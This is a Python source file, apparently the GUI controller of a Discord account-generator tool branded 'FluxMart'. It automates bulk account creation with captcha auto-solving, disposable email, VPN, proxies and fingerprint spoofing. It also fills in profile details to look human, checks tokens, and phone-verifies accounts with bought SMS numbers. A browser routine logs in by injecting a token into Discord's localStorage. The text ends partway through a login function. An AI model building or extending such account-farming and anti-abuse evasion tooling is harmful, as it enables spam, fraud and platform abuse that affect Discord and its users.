
def _gwc_no_window() -> int:
    import sys
    if sys.platform != 'win32':
        return 0
    return 0x08000000

_NO_WINDOW = _gwc_no_window()


def _kill_gen_browsers_only():
    """Target browser descendants from a process snapshot, never global name matches.

    Snapshot ancestry is not a persistent ownership guarantee: processes can exit
    or be reparented. Do not compensate with machine-wide command-line matching.
    """
    import os
    import subprocess

    our_pid = os.getpid()
    _BROWSER_NAMES = {"firefox.exe", "camoufox.exe", "chrome.exe", "chromium.exe", "brave.exe", "clearcote.exe"}

    # Method 1: Fast WMIC-based process tree kill (catches all descendants)
    try:
        result = subprocess.run(
            ["wmic", "process", "get", "Name,ProcessId,ParentProcessId", "/format:csv"],
            capture_output=True, text=True, timeout=10,
            creationflags=_NO_WINDOW
        )

        processes = {}
        for line in result.stdout.splitlines():
            parts = line.strip().split(',')
            if len(parts) < 4:
                continue
            try:
                name = parts[1].strip().lower()
                parent_pid = int(parts[2].strip())
                pid = int(parts[3].strip())
                processes[pid] = (name, parent_pid)
            except (ValueError, IndexError):
                continue

        def _descendants(root, procs, visited=None):
            if visited is None:
                visited = set()
            if root in visited:
                return set()
            visited.add(root)
            result_pids = set()
            for pid, (name, parent) in procs.items():
                if parent == root and pid not in visited:
                    result_pids.add(pid)
                    result_pids.update(_descendants(pid, procs, visited))
            return result_pids

        our_children = _descendants(our_pid, processes)

        for pid in our_children:
            if pid in processes and processes[pid][0] in _BROWSER_NAMES:
                subprocess.run(
                    ["taskkill", "/F", "/PID", str(pid), "/T"],
                    capture_output=True, text=True, creationflags=_NO_WINDOW
                )
    except Exception:
        pass

import os
import sys
import json
import time
import re
import base64
import threading
import hashlib
import ctypes
from typing import List, Dict, Optional, Any

from .Utils.env import get_base_path, get_resource_path, get_config_path
from .Utils.utils import save_config


def _load_internal_settings() -> Dict[str, Any]:
    config_path = get_config_path()
    defaults = _default_settings()
    try:
        if os.path.exists(config_path):
            from .Utils.utils import load_config
            loaded = load_config()
            merged = dict(defaults)
            merged.update(loaded)
            if "webhook" not in merged or not isinstance(merged.get("webhook"), dict):
                merged["webhook"] = defaults["webhook"]
            else:
                wh = merged["webhook"]
                if "enabled" not in wh:
                    wh["enabled"] = False
                if "url" not in wh:
                    wh["url"] = ""
                if "notify_all" not in wh:
                    wh["notify_all"] = False
            return merged
    except:
        pass
    _save_internal_settings(defaults)
    return defaults


def _save_internal_settings(settings: Dict[str, Any]):
    save_config(settings)


def _default_settings() -> Dict[str, Any]:
    return {
        "threads": 1,
        "captcha_timeout": 30,
        "headless": False,
        "auto_solver_captcha": True,
        "mullvad": False,
        "vpn_providers": {
            "mullvad": {
                "enabled": True
            }
        },
        "email_verification_delay": "0s",
        "email_providers": {
            "cybertemp": {
                "enabled": True,
                "api_key": ""
            },
            "mailcow": {
                "enabled": False,
                "host_url": "",
                "api_key": "",
                "domain": ""
            },
            "zeus": {
                "enabled": False,
                "api_key": "",
                "account_type": "HOTMAIL"
            },
            "hotmail007": {
                "enabled": False,
                "api_key": "",
                "mail_type": "hotmail"
            },
            "lution": {
                "enabled": False,
                "api_key": "",
                "account_type": "hotmail.trusted.graph"
            }
        },
        "ai_api": {
            "cloudflare": {"account_id": "f0f083c448327b55239ec74ab50528df", "api_key": "yourkey", "model": "@cf/openai/gpt-oss-120b"},
            "openrouter": {"api_key": "", "model": "liquid/lfm3-1.7b:free"},
            "groq": {"api_key": "", "model": "openai/gpt-oss-120b"},
        },
        "solver_ai": {"cloudflare": True, "groq": False, "openrouter": False},
        "proxies": {"enabled": False},
        "data_saver_enabled": False,
        "update_browser_save": False,
        "rate_limit_checker": {"enabled": False},
        "token_verify": True,
        "humanizer": {
            "enabled": False,
            "avatar": True,
            "pronouns": True,
            "bio": True,
            "hypesquad": True,
            "display_name": True
        },
        "smart_multithread": {
            "enabled": False,
            "trigger": "captcha_solved"
        },
        "logs": {"censor_token": True},
        "fingerprint_settings": {"use_custom_fingerprint": False},
        "token_count": 1,
        "browser_method": "brave",
        "language": "en",

        "webhook": {
            "enabled": False,
            "url": "",
            "notify_all": False
        },
        "captcha": {}
    }


# â”€â”€ Sensitive data redaction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Applied to every log message before it is stored or displayed.
# Patterns are checked in order; the first match wins.
import re as _re

# Token: 59+ char base64url string (Discord tokens follow this pattern)
_TOKEN_RE = _re.compile(
    r'(?<![A-Za-z0-9_-])[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}(?![A-Za-z0-9_-])'
)
# API key-style patterns: key=VALUE or "api_key": "VALUE" or Authorization: Bearer VALUE
_APIKEY_HEADER_RE = _re.compile(
    r'(?:api[-_]?key|apikey|access[-_]?token|secret|Authorization)\s*[=:]\s*["\']?([A-Za-z0-9_\-\.]{16,})',
    _re.IGNORECASE
)
# Bearer token in Authorization header
_BEARER_RE = _re.compile(
    r'(Bearer\s+)([A-Za-z0-9_\-\.]{16,})',
    _re.IGNORECASE
)
# Webhook URL (contains actual secret)
_WEBHOOK_URL_RE = _re.compile(
    r'(https?://(?:discord\.com|discordapp\.com)/api/webhooks/\d+/)([A-Za-z0-9_\-]{40,})',
    _re.IGNORECASE
)


def _redact_sensitive(message: str) -> str:
    """Return message with tokens, API keys, and auth credentials replaced."""
    if not message or not isinstance(message, str):
        return message
    # Webhook URL -- keep the base, redact the token part
    message = _WEBHOOK_URL_RE.sub(r'\1[REDACTED]', message)
    # Bearer / Authorization headers
    message = _BEARER_RE.sub(r'\1[REDACTED]', message)
    # API keys -- replace the value (group 1 is the value, no keyword group)
    message = _APIKEY_HEADER_RE.sub(lambda m: m.group(0).replace(m.group(1), '[REDACTED]'), message)
    # Discord token format (long base64url strings split by dots)
    message = _TOKEN_RE.sub(lambda m: m.group(0)[:10] + '***', message)
    return message


class GUIController:
    def __init__(self):
        self.logs: List[Dict] = []
        self._log_lock = threading.Lock()
        self._gen_state_lock = threading.Lock()
        self._stats_lock = threading.Lock()
        self._pre_stop = False
        self._settings = _load_internal_settings()
        self._generator = None
        self._generator_thread = None
        self._checker_thread = None
        self._checker_running = False
        self._selected_avatars: List[str] = []
        self._window = None
        
        self._cached_username = None
        self._cached_password = None

        self._stats = {
            "valid": 0,
            "invalid": 0,
            "locked": 0,
            "amount": 0,
            "concurrent_browsers": 0,
            "start_time": 0
        }

        self._checker_stats = {
            "valid": 0,
            "locked": 0,
            "invalid": 0,
            "total": 0,
            "current": 0
        }

        self._humanizer_thread = None
        self._humanizer_running = False
        self._humanizer_stats = {
            "success": 0,
            "failed": 0,
            "skipped": 0,
            "total": 0,
            "current": 0
        }

        self._pv_thread = None
        self._pv_running = False
        self._pv_stats = {
            "success": 0,
            "failed": 0,
            "pending": 0,
            "total": 0,
            "current": 0
        }

        try:
            from .Utils import keyauth as keyauth

            def _gui_stats():
                try:
                    gen_running = bool(self._generator_thread and self._generator_thread.is_alive())
                except Exception:
                    gen_running = False

                try:
                    checker_running = bool(self._checker_thread and self._checker_thread.is_alive())
                except Exception:
                    checker_running = False

                try:
                    humanizer_running = bool(self._humanizer_thread and self._humanizer_thread.is_alive())
                except Exception:
                    humanizer_running = False

                _sl = getattr(self, '_stats_lock', None)
                if _sl:
                    with _sl:
                        gen_stats = dict(self._stats or {})
                        checker_stats = dict(self._checker_stats or {})
                        humanizer_stats = dict(self._humanizer_stats or {})
                else:
                    gen_stats = dict(self._stats or {})
                    checker_stats = dict(self._checker_stats or {})
                    humanizer_stats = dict(self._humanizer_stats or {})
                gen_stats["running"] = gen_running

                return {
                    "mode": "gui",
                    "generator": gen_stats,
                    "checker": {
                        "running": checker_running,
                        **checker_stats
                    },
                    "humanizer": {
                        "running": humanizer_running,
                        **humanizer_stats
                    }
                }

            def _gui_sessions():
                gen = getattr(self, "_active_generator", None)
                if gen is None:
                    return {"generator": {"active": 0, "workers": []}}
                try:
                    with gen.lock:
                        running_workers = [int(wid) for wid, closed in (gen.browser_closed_flags or {}).items() if not closed]
                        ctx_workers = [int(wid) for wid in getattr(gen, "_browser_contexts", {}).keys()]
                    running_workers = sorted(set(running_workers))
                    ctx_workers = sorted(set(ctx_workers))
                    return {
                        "generator": {
                            "active": len(running_workers),
                            "workers": running_workers,
                            "browser_contexts": ctx_workers,
                        }
                    }
                except Exception:
                    return {"generator": {"active": 0, "workers": []}}

            keyauth.configure_local_api(get_stats=_gui_stats, get_sessions=_gui_sessions)
            keyauth.start_local_api()
        except Exception:
            pass

    def set_window(self, window):
        self._window = window
    
    # â”€â”€ Thread-safe stat helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    def _update_stat(self, key: str, value: Any) -> None:
        """Thread-safe update of a single generator stat."""
        with self._stats_lock:
            self._stats[key] = value

    def _increment_stat(self, key: str, amount: int = 1) -> None:
        """Thread-safe increment of a generator stat counter."""
        with self._stats_lock:
            self._stats[key] = self._stats.get(key, 0) + amount

    def _update_checker_stat(self, key: str, value: Any) -> None:
        """Thread-safe update of a checker stat."""
        with self._stats_lock:
            self._checker_stats[key] = value

    def _increment_checker_stat(self, key: str, amount: int = 1) -> None:
        """Thread-safe increment of a checker stat counter."""
        with self._stats_lock:
            self._checker_stats[key] = self._checker_stats.get(key, 0) + amount

    def _update_humanizer_stat(self, key: str, value: Any) -> None:
        """Thread-safe update of a humanizer stat."""
        with self._stats_lock:
            self._humanizer_stats[key] = value

    def _update_pv_stat(self, key: str, value: Any) -> None:
        """Thread-safe update of a phone verify stat."""
        with self._stats_lock:
            self._pv_stats[key] = value


    def log(self, message: str, log_type: str = "info"):
        message = _redact_sensitive(message)
        # Ensure Unicode characters are properly handled for GUI display
        try:
            # Encode to UTF-8 and decode back to ensure proper Unicode handling
            if isinstance(message, str):
                message = message.encode('utf-8', errors='ignore').decode('utf-8')
        except Exception:
            pass
        with self._log_lock:
            self.logs.append({"message": message, "type": log_type})

    def get_logs(self) -> List[Dict]:
        with self._log_lock:
            logs_copy = self.logs.copy()
            self.logs.clear()
        return logs_copy

    def clear_logs(self):
        with self._log_lock:
            self.logs.clear()

    def _send_webhook_embed(
        self,
        status: str,
        token: str,
        email: str,
        humanized: bool = False,
        phone_verified: bool = False,
        email_verified: bool = False,
        gen_time: float = 0.0,
        hcap_time: float = 0.0,
        email_time: float = 0.0,
        phone_time: float = 0.0,
        humanize_time: float = 0.0,
        note: str = "",
    ) -> None:
        """Send a Discord embed to the configured webhook URL after a valid token is created.
        Always reads config fresh from disk so the latest saved settings are used."""
        try:
            fresh_cfg = _load_internal_settings()
            cfg = fresh_cfg.get("webhook", {})

            if not cfg.get("enabled", False):
                return
            url = cfg.get("url", "").strip()
            if not url:
                return

            notify_all = cfg.get("notify_all", False)

            if status != "Valid" and not notify_all:
                return

            import requests as _req

            token = (token or "").strip()
            email = (email or "").strip()

            display_token = f"{token[:18]}{'*' * 7}" if len(token) > 18 else (token if token else "â€”")

            import datetime as _dt

            color = 0x050303

            if status == "Valid":
                ev_val  = "Verified"   if email_verified else "Not verified"
                ph_val  = "Verified"   if phone_verified  else "Not verified"
                hum_val = "Yes"        if humanized       else "No"

                total_time = gen_time + email_time + phone_time + humanize_time
                timing_parts = [f"Gen `{gen_time:.1f}s`"]
                if hcap_time > 0:
                    timing_parts.append(f"Captcha `{hcap_time:.1f}s`")
                if email_time > 0:
                    timing_parts.append(f"Email `{email_time:.1f}s`")
                if phone_time > 0:
                    timing_parts.append(f"Phone `{phone_time:.1f}s`")
                if humanize_time > 0:
                    timing_parts.append(f"Humanize `{humanize_time:.1f}s`")
                timing_str = "  Â·  ".join(timing_parts) + f"  Â·  **Total** `{total_time:.1f}s`"

                note_line = f"{note}\n" if note else ""
                description = (
                    f"{note_line}"
                    f"**Status** â€” Valid\n"
                    f"**Email** â€” {email if email else 'â€”'}\n"
                    f"**Email Verified** â€” {ev_val}\n"
                    f"**Phone Verified** â€” {ph_val}\n"
                    f"**Humanized** â€” {hum_val}\n"
                    f"**Token** â€” `{display_token}`"
                )

                fields = [
                    {"name": "Timing", "value": timing_str, "inline": False},
                ]

                embed = {
                    "title": "Token Generated",
                    "description": description,
                    "color": color,
                    "fields": fields,
                    "footer": {"text": "FluxMart"},
                    "timestamp": _dt.datetime.utcnow().isoformat() + "Z",
                }
            elif status == "Locked":
                embed = {
                    "title": "Token Generated",
                    "description": (
                        f"**Status** â€” Locked\n"
                        f"**Email** â€” {email or 'â€”'}"
                    ),
                    "color": color,
                    "footer": {"text": "FluxMart"},
                    "timestamp": _dt.datetime.utcnow().isoformat() + "Z",
                }
            else:
                embed = {
                    "title": "Token Generated",
                    "description": (
                        f"**Status** â€” Invalid\n"
                        f"**Email** â€” {email or 'â€”'}"
                    ),
                    "color": color,
                    "footer": {"text": "FluxMart"},
                    "timestamp": _dt.datetime.utcnow().isoformat() + "Z",
                }

            payload = {"embeds": [embed]}
            resp = _req.post(url, json=payload, timeout=10)
            resp.raise_for_status()
        except Exception as _wh_err:
            try:
                from .MskColors.color import MskColor
                _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                self.log(f"{_msk}{MskColor.RED}Webhook error: {str(_wh_err)[:120]}{_R}", "error")
            except Exception:
                pass

    def _send_session_start_webhook(self, token_count: int, threads: int) -> None:
        """Send a session-start embed showing run configuration."""
        try:
            fresh_cfg = _load_internal_settings()
            cfg = fresh_cfg.get("webhook", {})
            if not cfg.get("enabled", False):
                return
            url = cfg.get("url", "").strip()
            if not url:
                return

            import requests as _req, datetime as _dt

            _bm = fresh_cfg.get("browser_method", "brave")
            _bm_display_map = {
                "chromium2": "Chromium 2",
                "clearcote": "Clearcote",
            }
            browser_method = _bm_display_map.get(_bm, _bm.capitalize())
            proxies_enabled = fresh_cfg.get("proxies", {}).get("enabled", False)
            vpn_providers = fresh_cfg.get("vpn_providers", {})
            vpn_active = vpn_providers.get("mullvad", {}).get("enabled", False) or fresh_cfg.get("mullvad", False)
            humanizer_enabled = fresh_cfg.get("humanizer", {}).get("enabled", False)
            headless = fresh_cfg.get("headless", True)

            description = (
                f"**Tokens** â€” {token_count}  Â·  **Threads** â€” {threads}\n"
                f"**Browser** â€” {browser_method}\n"
                f"**Proxies** â€” {'Yes' if proxies_enabled else 'No'}\n"
                f"**VPN** â€” {'Yes' if vpn_active else 'No'}\n"
                f"**Humanizer** â€” {'Yes' if humanizer_enabled else 'No'}\n"
                f"**Headless** â€” {'Yes' if headless else 'No'}"
            )

            payload = {"embeds": [{
                "title": "Generation Started",
                "description": description,
                "color": 0x050303,
                "footer": {"text": "FluxMart"},
                "timestamp": _dt.datetime.utcnow().isoformat() + "Z",
            }]}
            _req.post(url, json=payload, timeout=10)
        except Exception:
            pass

    def _send_session_complete_webhook(self, token_count: int, elapsed: float) -> None:
        """Send a session-summary embed when all tokens are done."""
        try:
            fresh_cfg = _load_internal_settings()
            cfg = fresh_cfg.get("webhook", {})
            if not cfg.get("enabled", False):
                return
            url = cfg.get("url", "").strip()
            if not url:
                return

            import requests as _req, datetime as _dt

            valid   = self._stats.get("valid", 0)
            locked  = self._stats.get("locked", 0)
            invalid = self._stats.get("invalid", 0)
            total   = valid + locked + invalid

            mins, secs = divmod(int(elapsed), 60)
            time_str = f"{mins}m {secs}s" if mins else f"{secs}s"

            description = (
                f"**Tokens Requested** â€” {token_count}\n"
                f"**Total Processed** â€” {total}\n\n"
                f"**Valid** â€” {valid}\n"
                f"**Locked** â€” {locked}\n"
                f"**Invalid** â€” {invalid}\n\n"
                f"**Total Time** â€” {time_str}"
            )

            payload = {"embeds": [{
                "title": "Generation Complete",
                "description": description,
                "color": 0x050303,
                "footer": {"text": "FluxMart"},
                "timestamp": _dt.datetime.utcnow().isoformat() + "Z",
            }]}
            _req.post(url, json=payload, timeout=10)
        except Exception:
            pass

    def test_webhook(self, url: str) -> Dict:
        """Send a test embed to the given webhook URL and return success/error."""
        try:
            import requests as _requests
            if not url or not url.strip():
                return {"success": False, "error": "No webhook URL provided"}
            url = url.strip()
            payload = {
                "embeds": [{
                    "title": "Webhook Test",
                    "description": "Your webhook is connected and working correctly!",
                    "color": 0x050303,
                    "fields": [
                        {"name": "Status", "value": "Connected", "inline": True},
                        {"name": "Tool", "value": "FluxMart", "inline": True},
                    ],
                    "footer": {"text": "FluxMart v3.3.4 â€” Webhook Test"}
                }]
            }
            resp = _requests.post(url, json=payload, timeout=10)
            if resp.status_code in (200, 204):
                return {"success": True}
            else:
                return {"success": False, "error": f"Discord returned HTTP {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)[:120]}

    def get_account_info(self, provided_username: str = None, provided_password: str = None) -> Dict:
        try:
            from .Utils.keyauth import api, KEYAUTH_APP_NAME, KEYAUTH_OWNER_ID, KEYAUTH_VERSION
            from .Utils import keyauth
            from .Utils.auto_login import AutoLogin
            import datetime
            
            def format_date(timestamp):
                if not timestamp or timestamp == "0": return "N/A"
                try:
                    dt = datetime.datetime.fromtimestamp(int(timestamp))
                    return dt.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    return timestamp

            username = provided_username or self._cached_username or "N/A"
            password = provided_password or self._cached_password or "N/A"
            license_key = "N/A"
            hwid = "N/A"
            sub_info = "N/A"
            expiry = "N/A"
            creation_date = "N/A"
            last_login = "N/A"
            ip = "N/A"
            user = None

            if hasattr(keyauth, 'keyauthapp') and keyauth.keyauthapp and getattr(keyauth.keyauthapp, 'user_data', None):
                user = keyauth.keyauthapp.user_data
                if provided_password:
                    password = provided_password
                elif self._cached_password:
                    password = self._cached_password

            if not user or provided_username or provided_password:
                if not provided_username or not provided_password:
                    if not provided_username and self._cached_username: username = self._cached_username
                    if not provided_password and self._cached_password: password = self._cached_password
                    
                    if username == "N/A" or password == "N/A":
                        auto = AutoLogin()
                        creds = auto.load_credentials()
                        if creds:
                            if username == "N/A": username = creds.get("username", username)
                            if password == "N/A": password = creds.get("password", password)
                
                if username != "N/A" and password != "N/A":
                    checksum = self._getchecksum()
                    keyauth.keyauthapp = api(
                        name=KEYAUTH_APP_NAME,
                        ownerid=KEYAUTH_OWNER_ID,
                        version=KEYAUTH_VERSION,
                        hash_to_check=checksum,
                        gui_mode=True
                    )
                    
                    try:
                        if keyauth.keyauthapp.login(username, password):
                            user = keyauth.keyauthapp.user_data
                    except:
                        pass

            if user:
                username = getattr(user, 'username', username)
                hwid = getattr(user, 'hwid', 'N/A')
                creation_date = format_date(getattr(user, 'createdate', '0'))
                last_login = format_date(getattr(user, 'lastlogin', '0'))
                ip = getattr(user, 'ip', 'N/A')
                
                if hasattr(user, 'subscriptions') and user.subscriptions:
                    sub = user.subscriptions[0]
                    sub_info = sub.get("subscription", "Standard")
                    expiry = format_date(sub.get("expiry"))
                    license_key = sub.get("key", "N/A")

            return {
                "success": True,
                "username": username or "N/A",
                "password": password or "N/A",
                "license_key": license_key or "N/A",
                "hwid": hwid or (keyauth.keyauthapp.get_hwid() if hasattr(keyauth, 'keyauthapp') and keyauth.keyauthapp else "N/A"),
                "creation_date": creation_date,
                "last_login": last_login,
                "expiration_date": expiry,
                "subscription": sub_info,
                "ip": ip or "N/A"
            }
        except Exception as e:
            return {
                "success": True,
                "username": "N/A",
                "password": "N/A",
                "license_key": "N/A",
                "hwid": "N/A",
                "creation_date": "N/A",
                "last_login": "N/A",
                "expiration_date": "N/A",
                "subscription": "N/A",
                "ip": "N/A",
                "error": str(e)
            }

    def discord_get_cached_user(self) -> Dict:
        """Return cached Discord user info (stub method - feature not implemented)."""
        return {"success": False, "user": None}


    def get_stats(self) -> Dict:
        with self._stats_lock:
            stats = dict(self._stats)
        stats["running"] = bool(self._generator_thread and self._generator_thread.is_alive())
        
        # Calculate tph (tokens per hour) based on actual token creation time
        if stats.get("start_time") and stats.get("start_time") > 0:
            elapsed = time.time() - stats["start_time"]
            total = stats.get("valid", 0) + stats.get("locked", 0) + stats.get("invalid", 0)
            if total > 0 and elapsed > 5:
                # Average seconds per token, then project to 1 hour
                avg_seconds_per_token = elapsed / total
                stats["tph"] = round(3600 / avg_seconds_per_token)
            else:
                stats["tph"] = 0
        else:
            stats["tph"] = 0
            
        return stats

    def get_checker_stats(self) -> Dict:
        with self._stats_lock:
            stats = dict(self._checker_stats)
        stats["running"] = bool(self._checker_thread and self._checker_thread.is_alive())
        return stats

    def reset_stats(self) -> Dict:
        """Reset generator stats to zero (called when user presses Clear)."""
        with self._stats_lock:
            self._stats = {
                "valid": 0,
                "invalid": 0,
                "locked": 0,
                "amount": 0,
                "concurrent_browsers": 0,
                "start_time": 0
            }
        return {"success": True}

    def reset_checker_stats(self) -> Dict:
        """Reset checker stats to zero (called when user presses Clear)."""
        with self._stats_lock:
            self._checker_stats = {
                "valid": 0,
                "locked": 0,
                "invalid": 0,
                "total": 0,
                "current": 0
            }
        return {"success": True}

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• PHONE VERIFY â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    def get_phone_verify_stats(self) -> Dict:
        with self._stats_lock:
            stats = dict(self._pv_stats)
        stats["running"] = bool(self._pv_thread and self._pv_thread.is_alive())
        return stats

    def reset_phone_verify_stats(self) -> Dict:
        with self._stats_lock:
            self._pv_stats = {
                "success": 0,
                "failed": 0,
                "pending": 0,
                "total": 0,
                "current": 0
            }
        return {"success": True}

    def pv_check_balance(self, provider: str, api_key: str) -> Dict:
        """Check SMS provider balance."""
        try:
            if provider == "fivesim":
                from .Utils.fivesim import FiveSimAPI
                api = FiveSimAPI(api_key)
                bal = api.get_balance()
                if bal is not None and bal >= 0:
                    return {"success": True, "provider": "5sim", "balance": f"{bal:.2f}"}
                return {"success": False, "error": "Invalid API key or connection error"}

            elif provider == "onlinesim":
                from .Utils.onlinesim import OnlineSimAPI
                api = OnlineSimAPI(api_key)
                bal = api.get_balance()
                if bal >= 0:
                    return {"success": True, "provider": "OnlineSim", "balance": f"{bal:.2f}"}
                return {"success": False, "error": "Invalid API key or connection error"}

            elif provider == "hero_sms":
                from .Utils.hero_sms import HeroSmsAPI
                api = HeroSmsAPI(api_key)
                bal = api.get_balance()
                if bal >= 0:
                    return {"success": True, "provider": "Hero SMS", "balance": f"{bal:.2f}"}
                return {"success": False, "error": "Invalid API key or connection error"}

            return {"success": False, "error": f"Unknown provider: {provider}"}
        except Exception as e:
            return {"success": False, "error": str(e)[:200]}

    def start_phone_verify(self, tokens: List[str], config: Dict) -> Dict:
        """Start phone verification for a list of tokens."""
        if self._pv_thread and self._pv_thread.is_alive():
            return {"success": False, "error": "Phone verification already running"}

        provider = config.get("provider", "fivesim")
        api_key = config.get("apiKey", "")
        country = config.get("country", "any")
        mode = config.get("mode", "api")
        max_price = float(config.get("maxPrice", 0) or 0)

        if not api_key:
            return {"success": False, "error": "API key is required"}

        self._pv_running = True
        self._pv_stats = {
            "success": 0,
            "failed": 0,
            "pending": len(tokens),
            "total": len(tokens),
            "current": 0
        }

        self._pv_thread = threading.Thread(
            target=self._run_phone_verify,
            args=(tokens, provider, api_key, country, mode, max_price),
            daemon=True
        )
        self._pv_thread.start()
        return {"success": True}

    def stop_phone_verify(self) -> Dict:
        self._pv_running = False
        return {"success": True}

    def _run_phone_verify(self, tokens: List[str], provider: str, api_key: str, country: str, mode: str, max_price: float = 0):
        """Worker thread for phone verification."""
        try:
            verifier = None

            if provider == "fivesim":
                from .Utils.fivesim import PhoneVerifier
                verifier = PhoneVerifier(api_key, number_limit=0, country=country, operator="any")
            elif provider == "onlinesim":
                from .Utils.onlinesim import OnlineSimVerifier
                verifier = OnlineSimVerifier(api_key, number_limit=0, country=country, operator="any")
            elif provider == "hero_sms":
                from .Utils.hero_sms import HeroSmsVerifier
                verifier = HeroSmsVerifier(
                    api_key, number_limit=0,
                    country=int(country) if country.isdigit() else 62,
                    max_price=max_price, fixed_price=True
                )

            if not verifier:
                self._pv_stats["failed"] = len(tokens)
                self._pv_stats["pending"] = 0
                self._pv_stats["current"] = len(tokens)
                return

            output_path = get_resource_path("data/output/phone_verified.txt")
            os.makedirs(os.path.dirname(output_path), exist_ok=True)

            for i, token_line in enumerate(tokens):
                if not self._pv_running:
                    break

                token_line = token_line.strip()
                if not token_line:
                    self._pv_stats["current"] = i + 1
                    self._pv_stats["pending"] = max(0, self._pv_stats["pending"] - 1)
                    self._pv_stats["failed"] += 1
                    continue

                # Extract token from email:pass:token format
                parts = token_line.split(":")
                if len(parts) >= 3:
                    token = parts[-1].strip()
                    email = parts[0].strip()
                else:
                    token = token_line.strip()
                    email = ""

                if not token or len(token) < 50:
                    self._pv_stats["current"] = i + 1
                    self._pv_stats["pending"] = max(0, self._pv_stats["pending"] - 1)
                    self._pv_stats["failed"] += 1
                    self.log(f"[Phone] Skipped invalid token #{i+1}", "warning")
                    continue

                self.log(f"[Phone] Verifying token #{i+1}/{len(tokens)}...", "info")

                try:
                    if mode == "api":
                        success, result_msg = verifier.verify_phone(token, email=email)
                    else:
                        # Browser mode - use the existing browser-based verification
                        success, result_msg = self._pv_browser_verify(token, verifier, email, country)

                    self._pv_stats["current"] = i + 1
                    self._pv_stats["pending"] = max(0, self._pv_stats["pending"] - 1)

                    if success:
                        self._pv_stats["success"] += 1
                        self.log(f"[Phone] âœ“ Token #{i+1} verified: {result_msg[:30]}", "success")
                        # Save to output file
                        try:
                            with open(output_path, "a", encoding="utf-8") as f:
                                if email:
                                    f.write(f"{email}:{':'.join(parts[1:-1]) if len(parts) >= 3 else ''}:{token}\n")
                                else:
                                    f.write(f"{token}\n")
                        except Exception:
                            pass
                    else:
                        self._pv_stats["failed"] += 1
                        self.log(f"[Phone] âœ— Token #{i+1} failed: {result_msg}", "error")

                except Exception as e:
                    self._pv_stats["current"] = i + 1
                    self._pv_stats["pending"] = max(0, self._pv_stats["pending"] - 1)
                    self._pv_stats["failed"] += 1
                    self.log(f"[Phone] âœ— Token #{i+1} error: {str(e)[:80]}", "error")

            self._pv_running = False
            total_s = self._pv_stats["success"]
            total_f = self._pv_stats["failed"]
            self.log(f"[Phone] Done! {total_s} verified, {total_f} failed.", "info")

        except Exception as e:
            self._pv_running = False
            self.log(f"[Phone] Fatal error: {str(e)[:120]}", "error")

    def _pv_browser_verify(self, token: str, verifier, email: str, country: str):
        """Browser-based phone verification for a single token."""
        try:
            from camoufox.sync_api import Camoufox

            number_data = verifier.api.buy_number(country=country)
            if not number_data:
                return False, "Failed to get phone number"

            order_id = number_data["id"]
            phone = number_data["phone"]
            phone_formatted = phone if phone.startswith("+") else f"+{phone}"

            with Camoufox(headless=True, humanize=True) as browser:
                page = browser.new_page(no_viewport=True)
                page.goto("https://discord.com/login", timeout=30000, wait_until="domcontentloaded")

                import time
                time.sleep(3)

                # Inject token
                page.evaluate(f'''() => {{
                    function login(token) {{
                        setInterval(() => {{
                            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`;
                        }}, 50);
                        setTimeout(() => location.reload(), 2500);
                    }}
                    login("{token}");
                }}''')

                time.sleep(5)

                # Navigate to settings
                page.goto("https://discord.com/channels/@me", timeout=15000, wait_until="domcontentloaded")
                time.sleep(3)

                # Open user settings
                settings_btn = page.query_selector('button[aria-label="User Settings"]')
                if settings_btn:
                    settings_btn.click()
                    time.sleep(2)

                # Click "My Account" or go to phone section
                page.goto("https://discord.com/settings/account", timeout=10000, wait_until="domcontentloaded")
                time.sleep(3)

                # Find phone input or phone verify button
                phone_input = page.query_selector('input[type="tel"]')
                if not phone_input:
                    # Try clicking edit phone / add phone
                    edit_btns = page.query_selector_all('button')
                    for btn in edit_btns:
                        try:
                            txt = btn.inner_text().lower()
                            if 'phone' in txt and ('add' in txt or 'edit' in txt or 'verify' in txt):
                                btn.click()
                                time.sleep(2)
                                break
                        except:
                            continue
                    phone_input = page.query_selector('input[type="tel"]')

                if phone_input:
                    phone_input.fill(phone_formatted)
                    time.sleep(1)

                    # Click Send / Submit
                    submit_btn = page.query_selector('button:has-text("Send")')
                    if submit_btn:
                        submit_btn.click()
                        time.sleep(3)

                    # Wait for SMS
                    code = verifier.api.get_sms(order_id, timeout=120)
                    if not code:
                        verifier.api.cancel_order(order_id)
                        return False, "SMS timeout"

                    # Extract code
                    import re
                    verification_code = code
                    if not (code.isdigit() and len(code) == 6):
                        match = re.search(r'\b(\d{6})\b', code)
                        if match:
                            verification_code = match.group(1)

                    # Fill code
                    code_input = page.query_selector('input[name="code"], input[placeholder*="code" i]')
                    if code_input:
                        code_input.fill(verification_code)
                        time.sleep(1)
                        verify_btn = page.query_selector('button:has-text("Verify"), button:has-text("Submit")')
                        if verify_btn:
                            verify_btn.click()
                            time.sleep(3)

                    verifier.api.finish_order(order_id)
                    verifier._save_number(phone_formatted, email, token)
                    return True, phone_formatted
                else:
                    verifier.api.cancel_order(order_id)
                    return False, "Phone input not found"

        except Exception as e:
            try:
                verifier.api.cancel_order(order_id)
            except:
                pass
            return False, f"Browser error: {str(e)[:80]}"

    def auth_login(self, username: str, password: str, remember: bool = True) -> Dict:
        try:
            from .Utils import keyauth
            from .Utils.keyauth import api, KeyAuthError, KEYAUTH_APP_NAME, KEYAUTH_OWNER_ID, KEYAUTH_VERSION

            checksum = self._getchecksum()
            keyauth.keyauthapp = api(
                name=KEYAUTH_APP_NAME,
                ownerid=KEYAUTH_OWNER_ID,
